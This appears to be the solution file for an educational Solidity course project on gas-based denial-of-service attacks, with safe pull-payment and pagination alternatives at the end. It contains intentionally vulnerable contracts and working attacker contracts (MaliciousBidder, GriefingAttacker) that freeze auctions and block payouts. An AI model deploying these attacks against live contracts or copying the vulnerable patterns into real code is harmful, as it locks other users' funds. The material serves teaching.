// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * @title Project 37: Gas DoS Attacks - Complete Solution
 * @notice Educational contracts demonstrating gas-based denial of service attacks
 * @dev These contracts are intentionally vulnerable - DO NOT use in production
 */

/**
 * @title VulnerableAirdrop
 * @notice Demonstrates DoS via unbounded loop iteration
 * @dev Gas cost grows linearly with recipients array size
 *
 * VULNERABILITY: Unbounded loop over dynamic array
 * - Each iteration: ~21,000 gas (SSTORE) + ~9,000 gas (transfer) = ~30,000 gas
 * - 100 recipients: ~3,000,000 gas
 * - 1000 recipients: ~30,000,000 gas (near block limit)
 * - Attack: Add recipients until function exceeds block gas limit
 */
contract VulnerableAirdrop {
    address[] public recipients;
    mapping(address => bool) public hasReceived;

    event AirdropDistributed(address indexed recipient, uint256 amount);

    /**
     * @notice Distributes 1 ether to all recipients
     * @dev VULNERABLE: Unbounded loop can exceed block gas limit
     * Gas Analysis:
     * - Base cost: ~21,000 gas
     * - Per iteration: ~30,000 gas (storage + transfer)
     * - Breaks at: ~900-1000 recipients (depending on block limit)
     */
    function distributeAirdrop() public {
        // VULNERABILITY: No bounds on loop iteration
        for (uint256 i = 0; i < recipients.length; i++) {
            address recipient = recipients[i];

            // Check if already received to prevent double claiming
            if (!hasReceived[recipient]) {
                hasReceived[recipient] = true;

                // VULNERABILITY: External call in loop
                // If one transfer fails, entire function reverts
                payable(recipient).transfer(1 ether);

                emit AirdropDistributed(recipient, 1 ether);
            }
        }
    }

    /**
     * @notice Adds a recipient to the airdrop
     * @dev VULNERABLE: No bounds checking allows unlimited growth
     */
    function addRecipient(address _recipient) public {
        require(_recipient != address(0), "Invalid address");
        require(!hasReceived[_recipient], "Already added");

        // VULNERABILITY: Array can grow unbounded
        // Attacker can add unlimited recipients to bloat the array
        recipients.push(_recipient);
    }

    /**
     * @notice Adds multiple recipients at once
     * @dev Even more vulnerable - batch adds to speed up attack
     */
    function addRecipients(address[] calldata _recipients) public {
        for (uint256 i = 0; i < _recipients.length; i++) {
            if (!hasReceived[_recipients[i]] && _recipients[i] != address(0)) {
                recipients.push(_recipients[i]);
            }
        }
    }

    receive() external payable {}

    function getRecipientCount() public view returns (uint256) {
        return recipients.length;
    }
}

/**
 * @title VulnerableAuction
 * @notice Demonstrates DoS via malicious bidder blocking refunds
 *
 * VULNERABILITY: Push payment pattern with transfer()
 * - transfer() forwards only 2300 gas (enough for event, not for logic)
 * - Malicious contract can revert in receive() to block refunds
 * - Blocks entire auction functionality
 */
contract VulnerableAuction {
    address public highestBidder;
    uint256 public highestBid;
    uint256 public auctionEndTime;

    event NewHighestBid(address indexed bidder, uint256 amount);
    event AuctionEnded(address winner, uint256 amount);

    constructor(uint256 _duration) {
        auctionEndTime = block.timestamp + _duration;
    }

    /**
     * @notice Places a bid in the auction
     * @dev VULNERABLE: Uses transfer() which can be blocked by malicious receive()
     *
     * Attack Scenario:
     * 1. Malicious contract bids and becomes highestBidder
     * 2. Malicious contract reverts in receive() function
     * 3. Any new bid attempt fails when trying to refund malicious contract
     * 4. Auction is permanently stuck
     */
    function bid() public payable {
        require(block.timestamp < auctionEndTime, "Auction ended");
        require(msg.value > highestBid, "Bid not high enough");

        // VULNERABILITY: This transfer can be blocked
        // If current highestBidder reverts in fallback, this line fails
        // Entire function reverts, preventing new bids
        if (highestBid > 0) {
            payable(highestBidder).transfer(highestBid);
        }

        highestBidder = msg.sender;
        highestBid = msg.value;

        emit NewHighestBid(msg.sender, msg.value);
    }

    function endAuction() public {
        require(block.timestamp >= auctionEndTime, "Auction not ended");
        emit AuctionEnded(highestBidder, highestBid);
    }
}

/**
 * @title MaliciousBidder
 * @notice Attacker contract that blocks refunds to DoS the auction
 *
 * Attack Strategy:
 * 1. Bid in auction to become highest bidder
 * 2. Revert in receive() to block any refund attempts
 * 3. New bidders cannot place bids because refund fails
 * 4. Auction is effectively frozen
 */
contract MaliciousBidder {
    VulnerableAuction public auction;
    bool public blockRefunds = true;

    event AttackExecuted(uint256 bidAmount);
    event RefundBlocked(uint256 amount);

    constructor(address _auction) {
        auction = VulnerableAuction(_auction);
    }

    /**
     * @notice Places a bid to become highest bidder
     * @dev After this, the auction is vulnerable to DoS
     */
    function attack() public payable {
        require(msg.value > 0, "Need funds to bid");

        // Place bid to become highest bidder
        auction.bid{value: msg.value}();

        emit AttackExecuted(msg.value);
    }

    /**
     * @notice Malicious receive function that blocks refunds
     * @dev ATTACK: Reverts when anyone tries to refund us
     * This prevents new bids from being placed
     */
    receive() external payable {
        if (blockRefunds) {
            emit RefundBlocked(msg.value);
            revert("Blocking refund - DoS attack!");
        }
    }

    /**
     * @notice Allows attacker to disable blocking (for cleanup)
     */
    function disableBlocking() external {
        blockRefunds = false;
    }
}

/**
 * @title VulnerableMassPayment
 * @notice Demonstrates DoS via block gas limit
 *
 * VULNERABILITY: Unbounded loop with external calls
 * Gas Analysis:
 * - Per transfer: ~9,000 gas (ETH transfer) + ~5,000 gas (SSTORE reset)
 * - 100 payees: ~1,400,000 gas
 * - 1000 payees: ~14,000,000 gas
 * - 2000+ payees: Exceeds block gas limit
 */
contract VulnerableMassPayment {
    address[] public payees;
    mapping(address => uint256) public payments;
    mapping(address => bool) public isPayee;

    event PaymentAdded(address indexed payee, uint256 amount);
    event PaymentSent(address indexed payee, uint256 amount);

    /**
     * @notice Adds payment for a payee
     * @dev VULNERABLE: No bounds on array size
     */
    function addPayment(address _payee) public payable {
        require(_payee != address(0), "Invalid address");
        require(msg.value > 0, "No payment");

        // Add to array if first time
        if (!isPayee[_payee]) {
            payees.push(_payee);
            isPayee[_payee] = true;
        }

        // Accumulate payment
        payments[_payee] += msg.value;

        emit PaymentAdded(_payee, msg.value);
    }

    /**
     * @notice Executes all pending payments
     * @dev VULNERABLE: Unbounded loop can exceed block gas limit
     *
     * Attack Scenario:
     * 1. Attacker adds many payees with small payments
     * 2. Array grows beyond processable size
     * 3. executePayments() exceeds block gas limit
     * 4. Funds locked in contract forever
     */
    function executePayments() public {
        // VULNERABILITY: No bounds on loop
        for (uint256 i = 0; i < payees.length; i++) {
            address payee = payees[i];
            uint256 amount = payments[payee];

            if (amount > 0) {
                payments[payee] = 0;

                // VULNERABILITY: External call in loop
                // One failed transfer reverts entire function
                payable(payee).transfer(amount);

                emit PaymentSent(payee, amount);
            }
        }
    }

    function getPayeeCount() public view returns (uint256) {
        return payees.length;
    }
}

/**
 * @title ExpensiveFallbackRecipient
 * @notice Contract with expensive fallback that causes DoS
 *
 * VULNERABILITY: Expensive operations in receive()
 * - transfer() only forwards 2300 gas
 * - Expensive fallback consumes more gas
 * - Causes sender's transfer to fail
 */
contract ExpensiveFallbackRecipient {
    uint256[] public data;
    uint256 public constant LOOP_ITERATIONS = 100;

    event ReceivedPayment(address sender, uint256 amount);

    /**
     * @notice Expensive receive function
     * @dev ATTACK: Consumes way more than 2300 gas stipend
     *
     * Gas Analysis:
     * - Each SSTORE (new slot): ~20,000 gas
     * - 100 iterations: ~2,000,000 gas
     * - transfer() only provides: 2,300 gas
     * - Result: Always fails when used with transfer()
     */
    receive() external payable {
        // ATTACK: Expensive storage operations
        // This will fail with transfer() but succeed with call()
        for (uint256 i = 0; i < LOOP_ITERATIONS; i++) {
            data.push(i);
        }

        emit ReceivedPayment(msg.sender, msg.value);
    }

    function getDataLength() public view returns (uint256) {
        return data.length;
    }

    function clearData() public {
        delete data;
    }
}

/**
 * @title VulnerableDistributor
 * @notice Vulnerable reward distributor with push payments
 *
 * VULNERABILITIES:
 * 1. Unbounded loop over stakeholders
 * 2. Push payment pattern
 * 3. Single failure blocks entire distribution
 */
contract VulnerableDistributor {
    address[] public stakeholders;
    mapping(address => uint256) public shares;
    mapping(address => bool) public isStakeholder;
    uint256 public totalShares;

    event StakeholderAdded(address indexed stakeholder, uint256 shares);
    event RewardsDistributed(uint256 totalAmount);
    event RewardSent(address indexed recipient, uint256 amount);

    /**
     * @notice Adds a stakeholder with shares
     */
    function addStakeholder(address _stakeholder, uint256 _shares) public {
        require(_stakeholder != address(0), "Invalid address");
        require(_shares > 0, "Shares must be > 0");
        require(!isStakeholder[_stakeholder], "Already stakeholder");

        // VULNERABILITY: Unbounded array growth
        stakeholders.push(_stakeholder);
        isStakeholder[_stakeholder] = true;
        shares[_stakeholder] = _shares;
        totalShares += _shares;

        emit StakeholderAdded(_stakeholder, _shares);
    }

    /**
     * @notice Distributes rewards to all stakeholders
     * @dev VULNERABLE: Multiple DoS vectors
     *
     * Vulnerabilities:
     * 1. Unbounded loop - can exceed gas limit
     * 2. Push payments - can be blocked by malicious receive()
     * 3. All-or-nothing - one failure blocks entire distribution
     */
    function distributeRewards() public payable {
        require(msg.value > 0, "No rewards to distribute");
        require(totalShares > 0, "No stakeholders");

        // VULNERABILITY: Unbounded loop
        for (uint256 i = 0; i < stakeholders.length; i++) {
            address stakeholder = stakeholders[i];
            uint256 stakeholderShares = shares[stakeholder];

            // Calculate proportional reward
            uint256 reward = (msg.value * stakeholderShares) / totalShares;

            if (reward > 0) {
                // VULNERABILITY: transfer() can be blocked
                // If one stakeholder reverts, entire distribution fails
                payable(stakeholder).transfer(reward);

                emit RewardSent(stakeholder, reward);
            }
        }

        emit RewardsDistributed(msg.value);
    }

    function getStakeholderCount() public view returns (uint256) {
        return stakeholders.length;
    }
}

/**
 * @title GriefingAttacker
 * @notice Demonstrates griefing attack patterns
 *
 * Griefing: Causing harm without direct benefit
 * - Waste gas fees of others
 * - Block protocol functionality
 * - Degrade user experience
 */
contract GriefingAttacker {
    event AttackExecuted(address target);

    /**
     * @notice Griefs VulnerableDistributor
     * @dev Strategy:
     * 1. Add self as stakeholder
     * 2. Revert in receive() to block distributions
     * 3. All stakeholders suffer, attacker included (griefing)
     */
    function attackDistributor(address _distributor) public {
        VulnerableDistributor distributor = VulnerableDistributor(_distributor);

        // Add self as stakeholder with minimal shares
        // This ensures we're in the distribution loop
        distributor.addStakeholder(address(this), 1);

        emit AttackExecuted(_distributor);
    }

    /**
     * @notice Griefs VulnerableMassPayment
     * @dev Strategy: Add many small payments to bloat array
     */
    function attackMassPayment(address _payment, uint256 _count) public payable {
        VulnerableMassPayment payment = VulnerableMassPayment(_payment);

        // Add many payees with tiny amounts
        // Bloats array to make executePayments() exceed gas limit
        for (uint256 i = 0; i < _count; i++) {
            // Each payment is just 1 wei
            payment.addPayment{value: 1}(address(this));
        }

        emit AttackExecuted(_payment);
    }

    /**
     * @notice Griefs auction by repeatedly outbidding by minimum
     * @dev Wastes gas of other bidders
     */
    function griefAuction(address _auction, uint256 _times) public payable {
        VulnerableAuction auction = VulnerableAuction(_auction);

        uint256 bidAmount = msg.value / _times;

        for (uint256 i = 0; i < _times; i++) {
            auction.bid{value: bidAmount}();
        }

        emit AttackExecuted(_auction);
    }

    /**
     * @notice Malicious receive that blocks payments
     */
    receive() external payable {
        // Revert to block any payments
        revert("Griefing attack - blocking payment!");
    }
}

// ============================================================================
// SAFE IMPLEMENTATIONS - MITIGATION STRATEGIES
// ============================================================================

/**
 * @title SafeAirdropWithPagination
 * @notice Safe implementation using pagination
 *
 * MITIGATION: Bounded loops with user-controlled batching
 * - Maximum batch size enforced
 * - Predictable gas costs
 * - Multiple transactions to process all recipients
 */
contract SafeAirdropWithPagination {
    address[] public recipients;
    mapping(address => bool) public hasReceived;

    // MITIGATION: Hard cap on batch size
    uint256 public constant MAX_BATCH_SIZE = 50;

    event AirdropDistributed(address indexed recipient, uint256 amount);

    /**
     * @notice Distributes airdrop to a batch of recipients
     * @dev SAFE: Bounded loop with validation
     * @param _start Start index (inclusive)
     * @param _end End index (exclusive)
     */
    function distributeBatch(uint256 _start, uint256 _end) public {
        require(_end <= recipients.length, "End exceeds length");
        require(_end > _start, "Invalid range");

        // MITIGATION: Enforce maximum batch size
        require(_end - _start <= MAX_BATCH_SIZE, "Batch too large");

        // SAFE: Loop is bounded
        for (uint256 i = _start; i < _end; i++) {
            address recipient = recipients[i];

            if (!hasReceived[recipient]) {
                hasReceived[recipient] = true;
                payable(recipient).transfer(1 ether);

                emit AirdropDistributed(recipient, 1 ether);
            }
        }
    }

    function addRecipient(address _recipient) public {
        require(_recipient != address(0), "Invalid address");
        require(!hasReceived[_recipient], "Already added");
        recipients.push(_recipient);
    }

    receive() external payable {}

    function getRecipientCount() public view returns (uint256) {
        return recipients.length;
    }

    /**
     * @notice Calculate number of batches needed
     */
    function getBatchCount() public view returns (uint256) {
        uint256 count = recipients.length;
        return (count + MAX_BATCH_SIZE - 1) / MAX_BATCH_SIZE;
    }
}

/**
 * @title SafeAuctionWithPullPayments
 * @notice Safe auction using pull payment pattern
 *
 * MITIGATION: Pull payment pattern
 * - No external calls in critical functions
 * - Users withdraw their own refunds
 * - Malicious contracts can't block others
 */
contract SafeAuctionWithPullPayments {
    address public highestBidder;
    uint256 public highestBid;
    uint256 public auctionEndTime;

    // MITIGATION: Pull payment pattern
    mapping(address => uint256) public pendingReturns;

    event NewHighestBid(address indexed bidder, uint256 amount);
    event AuctionEnded(address winner, uint256 amount);
    event RefundAvailable(address indexed bidder, uint256 amount);

    constructor(uint256 _duration) {
        auctionEndTime = block.timestamp + _duration;
    }

    /**
     * @notice Places a bid in the auction
     * @dev SAFE: No external calls, uses pull pattern for refunds
     */
    function bid() public payable {
        require(block.timestamp < auctionEndTime, "Auction ended");
        require(msg.value > highestBid, "Bid not high enough");

        // MITIGATION: Record refund instead of sending it
        // No external call means no DoS vector
        if (highestBid > 0) {
            pendingReturns[highestBidder] += highestBid;
            emit RefundAvailable(highestBidder, highestBid);
        }

        highestBidder = msg.sender;
        highestBid = msg.value;

        emit NewHighestBid(msg.sender, msg.value);
    }

    /**
     * @notice Withdraws pending refunds
     * @dev SAFE: Each user controls their own withdrawal
     */
    function withdraw() public {
        uint256 amount = pendingReturns[msg.sender];
        require(amount > 0, "No refund available");

        // MITIGATION: CEI pattern - reset before transfer
        pendingReturns[msg.sender] = 0;

        payable(msg.sender).transfer(amount);
    }

    function endAuction() public {
        require(block.timestamp >= auctionEndTime, "Auction not ended");
        emit AuctionEnded(highestBidder, highestBid);
    }
}

/**
 * @title SafeMassPaymentWithPull
 * @notice Safe mass payment using pull pattern
 *
 * MITIGATION: Pull payment pattern
 * - No loops needed
 * - Each withdrawal is independent
 * - Predictable gas costs
 */
contract SafeMassPaymentWithPull {
    mapping(address => uint256) public pendingWithdrawals;

    event PaymentAdded(address indexed payee, uint256 amount);
    event PaymentWithdrawn(address indexed payee, uint256 amount);

    /**
     * @notice Adds payment for a payee
     * @dev SAFE: No arrays, no loops
     */
    function addPayment(address _payee) public payable {
        require(_payee != address(0), "Invalid address");
        require(msg.value > 0, "No payment");

        // MITIGATION: Simple mapping update, no arrays
        pendingWithdrawals[_payee] += msg.value;

        emit PaymentAdded(_payee, msg.value);
    }

    /**
     * @notice Withdraws pending payment
     * @dev SAFE: Individual withdrawal, no loops
     */
    function withdraw() public {
        uint256 amount = pendingWithdrawals[msg.sender];
        require(amount > 0, "No payment available");

        // MITIGATION: CEI pattern
        pendingWithdrawals[msg.sender] = 0;

        payable(msg.sender).transfer(amount);

        emit PaymentWithdrawn(msg.sender, amount);
    }

    function getPendingAmount(address _payee) public view returns (uint256) {
        return pendingWithdrawals[_payee];
    }
}

/**
 * @title SafeDistributorHybrid
 * @notice Hybrid approach: bounded batches + pull option
 *
 * MITIGATION: Multiple strategies
 * 1. Bounded batch processing
 * 2. Pull payment fallback
 * 3. Graceful handling of failed transfers
 */
contract SafeDistributorHybrid {
    address[] public stakeholders;
    mapping(address => uint256) public shares;
    mapping(address => bool) public isStakeholder;
    mapping(address => uint256) public pendingRewards;
    uint256 public totalShares;

    uint256 public constant MAX_BATCH_SIZE = 50;

    event StakeholderAdded(address indexed stakeholder, uint256 shares);
    event RewardsDistributed(uint256 totalAmount);
    event RewardSent(address indexed recipient, uint256 amount);
    event RewardFailed(address indexed recipient, uint256 amount);
    event RewardWithdrawn(address indexed stakeholder, uint256 amount);

    function addStakeholder(address _stakeholder, uint256 _shares) public {
        require(_stakeholder != address(0), "Invalid address");
        require(_shares > 0, "Shares must be > 0");
        require(!isStakeholder[_stakeholder], "Already stakeholder");

        stakeholders.push(_stakeholder);
        isStakeholder[_stakeholder] = true;
        shares[_stakeholder] = _shares;
        totalShares += _shares;

        emit StakeholderAdded(_stakeholder, _shares);
    }

    /**
     * @notice Distributes rewards in batches with graceful failure handling
     * @dev SAFE: Bounded loop + graceful failure handling
     */
    function distributeRewardsBatch(
        uint256 _start,
        uint256 _end
    ) public payable {
        require(msg.value > 0, "No rewards");
        require(totalShares > 0, "No stakeholders");
        require(_end <= stakeholders.length, "End exceeds length");
        require(_end > _start, "Invalid range");

        // MITIGATION: Enforce batch size
        require(_end - _start <= MAX_BATCH_SIZE, "Batch too large");

        // SAFE: Bounded loop
        for (uint256 i = _start; i < _end; i++) {
            address stakeholder = stakeholders[i];
            uint256 stakeholderShares = shares[stakeholder];
            uint256 reward = (msg.value * stakeholderShares) / totalShares;

            if (reward > 0) {
                // MITIGATION: Graceful failure handling with call()
                (bool success, ) = payable(stakeholder).call{value: reward}("");

                if (success) {
                    emit RewardSent(stakeholder, reward);
                } else {
                    // MITIGATION: If push fails, enable pull
                    pendingRewards[stakeholder] += reward;
                    emit RewardFailed(stakeholder, reward);
                }
            }
        }

        emit RewardsDistributed(msg.value);
    }

    /**
     * @notice Allows stakeholders to withdraw failed payments
     * @dev SAFE: Pull payment fallback
     */
    function withdrawReward() public {
        uint256 amount = pendingRewards[msg.sender];
        require(amount > 0, "No pending rewards");

        // CEI pattern
        pendingRewards[msg.sender] = 0;

        payable(msg.sender).transfer(amount);

        emit RewardWithdrawn(msg.sender, amount);
    }

    function getStakeholderCount() public view returns (uint256) {
        return stakeholders.length;
    }
}

/**
 * ═══════════════════════════════════════════════════════════════════════════
 *                          KEY TAKEAWAYS
 * ═══════════════════════════════════════════════════════════════════════════
 *
 * 1. UNBOUNDED LOOPS CAN EXCEED BLOCK GAS LIMIT
 *    ✅ Gas cost grows linearly with array size
 *    ✅ Block gas limit: ~30M gas (varies by network)
 *    ✅ Function becomes permanently unusable
 *    ✅ Real-world: Permanent DoS of contract functionality
 *
 * 2. PUSH PAYMENTS ARE VULNERABLE TO DOS
 *    ✅ Contract sends funds to recipients in loop
 *    ✅ One malicious recipient can block all payments
 *    ✅ transfer() only forwards 2,300 gas (insufficient!)
 *    ✅ CONNECTION TO PROJECT 12: Safe ETH transfer patterns!
 *
 * 3. PULL PAYMENTS ARE THE SOLUTION
 *    ✅ Recipients withdraw their own funds
 *    ✅ No loops, no DoS risk
 *    ✅ Each user pays their own gas
 *    ✅ Standard pattern for distributions
 *
 * 4. EXPENSIVE FALLBACK FUNCTIONS BLOCK REFUNDS
 *    ✅ Malicious contract reverts in receive()
 *    ✅ Blocks refunds to all users
 *    ✅ Use pull pattern instead of push
 *    ✅ Real-world: Auction contracts vulnerable
 *
 * 5. GRIEFING ATTACKS ARE LOW-COST DOS
 *    ✅ Attacker doesn't profit, just causes damage
 *    ✅ Can make contract unusable for others
 *    ✅ Economic DoS: Make operations unprofitable
 *    ✅ Requires economic disincentives
 *
 * 6. MITIGATION REQUIRES MULTIPLE STRATEGIES
 *    ✅ Pull payments instead of push
 *    ✅ Pagination for large datasets
 *    ✅ Maximum bounds on loops
 *    ✅ Use mappings with external indexing
 *
 * ═══════════════════════════════════════════════════════════════════════════
 *                        COMMON MISTAKES
 * ═══════════════════════════════════════════════════════════════════════════
 *
 * ❌ Unbounded loops over dynamic arrays (gas limit DoS!)
 * ❌ Push payments to multiple recipients (one blocks all!)
 * ❌ Using transfer() in loops (insufficient gas!)
 * ❌ No bounds checking on iterations
 *
 * ═══════════════════════════════════════════════════════════════════════════════
 *                          NEXT STEPS
 * ═══════════════════════════════════════════════════════════════════════════
 *
 * • Study pull payment patterns in detail
 * • Learn about pagination techniques
 * • Explore gas optimization strategies
 * • Move to Project 38 to learn about signature replay attacks
 */
